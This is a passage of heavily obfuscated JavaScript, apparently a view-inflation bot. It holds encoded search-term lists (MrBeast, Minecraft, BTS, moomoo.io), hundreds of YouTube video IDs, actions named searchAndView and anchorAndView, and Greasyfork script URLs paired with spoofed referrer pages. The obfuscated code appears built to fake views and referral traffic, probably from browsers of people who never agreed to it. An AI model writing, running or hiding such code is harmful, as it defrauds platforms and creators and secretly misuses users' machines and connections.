'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1af7 + -0xcd3 + -0xe1a * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xbf * -0x17 + 0x5a + -0x1179)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + X(0xa) + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x8b * -0x13 + 0x2cb + -0xd19);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    Y(0x9, 'VxNX') + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    Z(0x10) + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    Y(0x13, 'QT^o') + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    Z(0x1) + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + Y(0xd, '0J[U') + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + Y(0xb, '7WBY') + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + Y(0x8, 'mhM(') + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
